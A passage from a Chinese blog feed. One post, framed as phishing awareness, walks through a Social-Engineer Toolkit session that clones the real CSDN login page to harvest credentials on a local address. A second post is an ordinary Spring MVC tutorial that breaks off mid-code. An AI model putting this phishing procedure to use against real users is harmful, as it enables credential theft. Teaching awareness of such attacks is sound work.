XX</span><br><span class="line">XX   MMMy<span class="string">'                                                          '</span>yMMM   XX</span><br><span class="line">XX   Mh<span class="string">'                                                              '</span>hM   XX</span><br><span class="line">XX   -                                                                  -   XX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XX   ::                                                                ::   XX</span><br><span class="line">XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX</span><br><span class="line">XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX</span><br><span class="line">XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX</span><br><span class="line">XX   MMMMMM MMmm<span class="string">''</span>      <span class="string">'mmMMMMMMMMyy.  .yyMMMMMMMMmm'</span>      <span class="string">''</span>mmMM MMMMMM   XX</span><br><span class="line">XX   ---mMM <span class="string">''</span>             <span class="string">'mmMMMMMMMM  MMMMMMMMmm'</span>             <span class="string">''</span> MMm---   XX</span><br><span class="line">XX   yyyym<span class="string">'    .              '</span>mMMMMm<span class="string">'  '</span>mMMMMm<span class="string">'              .    '</span>myyyy   XX</span><br><span class="line">XX   mm<span class="string">''</span>    .y<span class="string">'     ..yyyyy..  '</span><span class="string">''</span><span class="string">'      '</span><span class="string">''</span><span class="string">'  ..yyyyy..     '</span>y.    <span class="string">''</span>mm   XX</span><br><span class="line">XX           <span class="keyword">MN</span>    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX</span><br><span class="line">XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX</span><br><span class="line">XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX</span><br><span class="line">XX              o+++     ++++Mo    M      M    oM++++     +++o              XX</span><br><span class="line">XX                                oo      oo                                XX</span><br><span class="line">XX           oM                 oo          oo                 Mo           XX</span><br><span class="line">XX         oMMo                M              M                oMMo         XX</span><br><span class="line">XX       +MMMM                 s              s                 MMMM+       XX</span><br><span class="line">XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX</span><br><span class="line">XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX</span><br><span class="line">XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX</span><br><span class="line">XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX</span><br><span class="line">XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX</span><br><span class="line">XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX</span><br><span class="line">XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX</span><br><span class="line">XX   MMMMd   <span class="string">''</span><span class="string">''</span>hhhhh       odddo          obbbo        hhhh<span class="string">''</span><span class="string">''</span>   dMMMM   XX</span><br><span class="line">XX   MMMMMd             <span class="string">'hMMMMMMMMMMddddddMMMMMMMMMMh'</span>             dMMMMM   XX</span><br><span class="line">XX   MMMMMMd              <span class="string">'hMMMMMMMMMMMMMMMMMMMMMMh'</span>              dMMMMMM   XX</span><br><span class="line">XX   MMMMMMM-               <span class="string">''</span>ddMMMMMMMMMMMMMMdd<span class="string">''</span>               -MMMMMMM   XX</span><br><span class="line">XX   MMMMMMMM                   <span class="string">'::dddddddd::'</span>                   MMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMM-                                                  -MMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMM                                                  MMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMy                                                yMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">    .o88o.                               o8o                .</span><br><span class="line">    <span class="number">888</span> `<span class="string">"                               `"</span><span class="string">'              .o8</span></span><br><span class="line"><span class="string">   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo</span></span><br><span class="line"><span class="string">    888    d88(  "8 d88'</span> `<span class="number">88</span>b d<span class="number">88</span><span class="string">' `"Y8 `888  d88'</span> `<span class="number">88</span>b   <span class="number">888</span>    `<span class="number">88</span>.  <span class="number">.8</span><span class="string">'</span></span><br><span class="line"><span class="string">    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'</span></span><br><span class="line">    <span class="number">888</span>    o.  )<span class="number">88</span>b <span class="number">888</span>   <span class="number">888</span> <span class="number">888</span>   .o<span class="number">8</span>  <span class="number">888</span>  <span class="number">888</span>    .o   <span class="number">888</span> .    `<span class="number">888</span><span class="string">'</span></span><br><span class="line"><span class="string">   o888o   8""888P'</span> `Y8bod8P<span class="string">' `Y8bod8P'</span> o888o `Y8bod8P<span class="string">'   "888"      d8'</span></span><br><span class="line">                                                                .o...<span class="keyword">P</span><span class="string">'</span></span><br><span class="line"><span class="string">                                                                `XER0'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[---]        The Social-Engineer Toolkit (SET)         [---]</span><br><span class="line">[---]        Created by: David Kennedy (ReL1K)         [---]</span><br><span class="line">                      Version: <span class="number">7</span><span class="number">.7</span><span class="number">.9</span></span><br><span class="line">                   Codename: <span class="string">'Blackout'</span></span><br><span class="line">[---]        Follow us on Twitter: @TrustedSec         [---]</span><br><span class="line">[---]        Follow me on Twitter: @HackingDave        [---]</span><br><span class="line">[---]       Homepage: https:<span class="comment">//www.trustedsec.com       [---]</span></span><br><span class="line"><span class="comment">        Welcome to the Social-Engineer Toolkit (SET).</span></span><br><span class="line"><span class="comment">         The one stop shop for all of your SE needs.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     Join us on irc.freenode.net in channel #setoolkit</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The Social-Engineer Toolkit is a product of TrustedSec.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           Visit: https://www.trustedsec.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   It's easy to update using the PenTesters Framework! (PTF)</span></span><br><span class="line"><span class="comment">Visit https://github.com/trustedsec/ptf to update all your tools!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Select from the menu:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1) Spear-Phishing Attack Vectors</span></span><br><span class="line"><span class="comment">   2) Website Attack Vectors</span></span><br><span class="line"><span class="comment">   3) Infectious Media Generator</span></span><br><span class="line"><span class="comment">   4) Create a Payload and Listener</span></span><br><span class="line"><span class="comment">   5) Mass Mailer Attack</span></span><br><span class="line"><span class="comment">   6) Arduino-Based Attack Vector</span></span><br><span class="line"><span class="comment">   7) Wireless Access Point Attack Vector</span></span><br><span class="line"><span class="comment">   8) QRCode Generator Attack Vector</span></span><br><span class="line"><span class="comment">   9) Powershell Attack Vectors</span></span><br><span class="line"><span class="comment">  10) SMS Spoofing Attack Vector</span></span><br><span class="line"><span class="comment">  11) Third Party Modules</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return back to the main menu.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set&gt; 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1) Java Applet Attack Method</span></span><br><span class="line"><span class="comment">   2) Metasploit Browser Exploit Method</span></span><br><span class="line"><span class="comment">   3) Credential Harvester Attack Method</span></span><br><span class="line"><span class="comment">   4) Tabnabbing Attack Method</span></span><br><span class="line"><span class="comment">   5) Web Jacking Attack Method</span></span><br><span class="line"><span class="comment">   6) Multi-Attack Web Method</span></span><br><span class="line"><span class="comment">   7) Full Screen Attack Method</span></span><br><span class="line"><span class="comment">   8) HTA Attack Method</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return to Main Menu</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt;3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The first method will allow SET to import a list of pre-defined web</span></span><br><span class="line"><span class="comment"> applications that it can utilize within the attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The second method will completely clone a website of your choosing</span></span><br><span class="line"><span class="comment"> and allow you to utilize the attack vectors within the completely</span></span><br><span class="line"><span class="comment"> same web application you were attempting to clone.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The third method allows you to import your own website, note that you</span></span><br><span class="line"><span class="comment"> should only have an index.html when using the import website</span></span><br><span class="line"><span class="comment"> functionality.</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   1) Web Templates</span></span><br><span class="line"><span class="comment">   2) Site Cloner</span></span><br><span class="line"><span class="comment">   3) Custom Import</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  99) Return to Webattack Menu</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt;2</span></span><br><span class="line"><span class="comment">[-] Credential harvester will allow you to utilize the clone capabilities within SET</span></span><br><span class="line"><span class="comment">[-] to harvest credentials or parameters from a website as well as place them into a report</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The way that this works is by cloning a site and looking for form fields to</span></span><br><span class="line"><span class="comment">rewrite. If the POST fields are not usual methods for posting forms this </span></span><br><span class="line"><span class="comment">could fail. If it does, you can always save the HTML, rewrite the forms to</span></span><br><span class="line"><span class="comment">be standard forms and use the "IMPORT" feature. Additionally, really </span></span><br><span class="line"><span class="comment">important:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL</span></span><br><span class="line"><span class="comment">IP address below, not your NAT address. Additionally, if you don't know</span></span><br><span class="line"><span class="comment">basic networking concepts, and you have a private IP address, you will</span></span><br><span class="line"><span class="comment">need to do port forwarding to your NAT IP address from your external IP</span></span><br><span class="line"><span class="comment">address. A browser doesns't know how to communicate with a private IP</span></span><br><span class="line"><span class="comment">address, so if you don't specify an external IP address if you are using</span></span><br><span class="line"><span class="comment">this from an external perpective, it will not work. This isn't a SET issue</span></span><br><span class="line"><span class="comment">this is how networking works.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.31.103]:</span></span><br><span class="line"><span class="comment">[-] SET supports both HTTP and HTTPS</span></span><br><span class="line"><span class="comment">[-] Example: http://www.thisisafakesite.com</span></span><br><span class="line"><span class="comment">set:webattack&gt; Enter the url to clone:https://passport.csdn.net/login</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[*] Cloning the website: https://passport.csdn.net/login</span></span><br><span class="line"><span class="comment">[*] This could take a little bit...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The best way to use this attack is if username and password form</span></span><br><span class="line"><span class="comment">fields are available. Regardless, this captures all POSTs on a website.</span></span><br><span class="line"><span class="comment">[*] You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.</span></span><br><span class="line"><span class="comment">Press &#123;return&#125; if you understand what we're saying here.</span></span><br><span class="line"><span class="comment">[*] The Social-Engineer Toolkit Credential Harvester Attack</span></span><br><span class="line"><span class="comment">[*] Credential Harvester is running on port 80</span></span><br><span class="line"><span class="comment">[*] Information will be displayed to you as it arrives below:</span></span><br><span class="line"><span class="comment">directory traversal attempt detected from: 192.168.31.103</span></span><br><span class="line"><span class="comment">192.168.31.103 - - [14/Dec/2018 19:08:55] "GET /api/v4/search/preset_words HTTP/1.1" 404 -</span></span><br><span class="line"><span class="comment">192.168.31.103 - - [14/Dec/2018 19:08:58] "GET / HTTP/1.1" 200 -</span></span><br></pre></td></tr></table></figure><center>------------------------------------------分割线------------------------------------------</center><p>有点累了，后面的内容日后有时间再来更新吧。</p><div style="text-align: right">2018-12-14,By Zero</div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处通知、竞赛确认、务必查收等社工邮件亦或短信，是在是可恶至极，所以就再来水一篇文章吧。之后Zero搜索下相关新闻咨询，发现类似诈骗案件的报道还真不少，一大叠一大叠的层出不穷，令人遗憾的是有不少用户抵抗不了自己的好奇心从而咬住了攻击者的“鱼钩”，故而给对方有了可乘之机。&lt;br&gt;&lt;img src=&quot;https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/1.png&quot; width=&quot;600&quot;&gt;&lt;/p&gt;
&lt;p&gt;Zero最近同样收到了不少这种邮件，比如昨天下午收到的这封：&lt;br&gt;&lt;img src=&quot;https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/2.png&quot; width=&quot;600&quot;&gt;&lt;/p&gt;
&lt;p&gt;虽然类似这种现象很是常见，但是万变不离其宗，攻击者主要是利用社会工程学 + 人们对事物的好奇心理来实行攻击。你的兴趣爱好、个人情感甚至是你的某一篇朋友圈等信息对于他们来说就富含了极大的价值，他们往往能够从中洞察一些别样的信息，也许这些不起眼的信息正是他成功攻击的关键。&lt;/p&gt;
&lt;p&gt;所以说，在日常生活中，加强我们的网络安全意识是有必要的，不要天真的以为这些离你还很远，等到来临的那一刻恐怕就为时已晚了。在之前的文章中，已经介绍了无线wifi的入侵，可见：&lt;a href=&quot;https://jacklxj.github.io/2018/12/14/WIFI%E7%A0%B4%E8%A7%A3/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Wifi破解&lt;/a&gt;&lt;br&gt;本文主要介绍以下一些常见的攻击手段，希望能对读者有所帮助：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;社工邮件&lt;/li&gt;
&lt;li&gt;钓鱼网站&lt;/li&gt;
&lt;li&gt;安卓渗透&lt;/li&gt;
&lt;li&gt;短信诈骗&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="白帽子" scheme="https://muzimz.cn/categories/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    
    
      <category term="Kali" scheme="https://muzimz.cn/tags/Kali/"/>
    
      <category term="setoolkit" scheme="https://muzimz.cn/tags/setoolkit/"/>
    
      <category term="exploit" scheme="https://muzimz.cn/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>Spring MVC的学习</title>
    <link href="https://muzimz.cn/2018/12/03/Spring%20MVC%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>https://muzimz.cn/2018/12/03/Spring MVC的学习/</id>
    <published>2018-12-03T10:35:13.000Z</published>
    <updated>2020-02-21T03:05:46.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-MVC的学习"><a href="#Spring-MVC的学习" class="headerlink" title="Spring MVC的学习"></a><strong><center>Spring MVC的学习</center></strong></h1><h2 id="1-Spring-MVC环境搭建"><a href="#1-Spring-MVC环境搭建" class="headerlink" title="1. Spring MVC环境搭建"></a><strong>1. Spring MVC环境搭建</strong></h2><h3 id="1-1-创建SpringMVCDemo项目并添加Spring支持"><a href="#1-1-创建SpringMVCDemo项目并添加Spring支持" class="headerlink" title="1.1 创建SpringMVCDemo项目并添加Spring支持"></a><strong>1.1 创建SpringMVCDemo项目并添加Spring支持</strong></h3><h3 id="1-2-修改applicationContext-xml文件"><a href="#1-2-修改applicationContext-xml文件" class="headerlink" title="1.2 修改applicationContext.xml文件"></a><strong>1.2 修改applicationContext.xml文件</strong></h3><p>在namespace中添加context和mvc，如此一来就支持了Spring MVC</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.tianxingjian"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 定义Spring MVC的处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-3-修改web-xml文件"><a href="#1-3-修改web-xml文件" class="headerlink" title="1.3 修改web.xml文件"></a><strong>1.3 修改web.xml文件</strong></h3><ul><li>最好的MVC设计，所有的控制器的处理依然是Servlet完成，而Spring MVC</li><li>Servlet类：org.springframework.web.servlet.DispatcherServlet</li></ul><p>web.xml文件完整代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>SpringMVCDemo<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- 此部分的操作是负责整个Spring容器启动的，即便使用了Spring MVC也不能缺少 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- 配置Spring MVC之中要使用的控制器 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.action<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-实现Spring-MVC程序"><a href="#2-实现Spring-MVC程序" class="headerlink" title="2. 实现Spring MVC程序"></a><strong>2. 实现Spring MVC程序</strong></h2><h3 id="2-1-建立Message-java和Type-java类"><a href="#2-1-建立Message-java和Type-java类" class="headerlink" title="2.1 建立Message.java和Type.java类"></a><strong>2.1 建立Message.java和Type.java类</strong></h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package com.tianxingjian.vo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.sql.<span class="built_in">Date</span>;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(<span class="string">"serial"</span>)</span><br><span class="line"><span class="keyword">public</span> class Message implements Serializable&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">Integer</span> mid;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">String</span> title;</span><br><span class="line"><span class="keyword">private</span> Double price;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">Date</span> <span class="built_in">date</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">Type</span> <span class="keyword">type</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">Integer</span> getMid() &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="literal">void</span> setMid(<span class="built_in">Integer</span> mid) &#123;</span><br><span class="line">this.mid = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">String</span> getTitle() &#123;</span><br><span class="line"><span class="keyword">return</span> title;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="literal">void</span> setTitle(<span class="built_in">String</span> title) &#123;</span><br><span class="line">this.title = title;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Double getPrice() &#123;</span><br><span class="line"><span class="keyword">return</span> price;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="literal">void</span> setPrice(Double price) &#123;</span><br><span class="line">this.price = price;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">Date</span> getDate() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">date</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="literal">void</span> setDate(<span class="built_in">Date</span> <span class="built_in">date</span>) &#123;</span><br><span class="line">this.<span class="built_in">date</span> = <span class="built_in">date</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Type</span> getType() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">type</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="literal">void</span> setType(<span class="keyword">Type</span> <span class="keyword">type</span>) &#123;</span><br><span class="line">this.<span class="keyword">type</span> = <span class="keyword">type</span>;</span><br><span class="line">&#125;</span><br><span class="line">@Override</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">String</span> toString() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Message [mid="</span> + mid + <span class="string">", title="</span> + title + <span class="string">", price="</span> + price + <span class="string">", date="</span> + <span class="built_in">date</span> + <span class="string">", type="</span> + <span class="keyword">type</span></span><br><span class="line">+ <span class="string">"]"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.vo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> title;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span 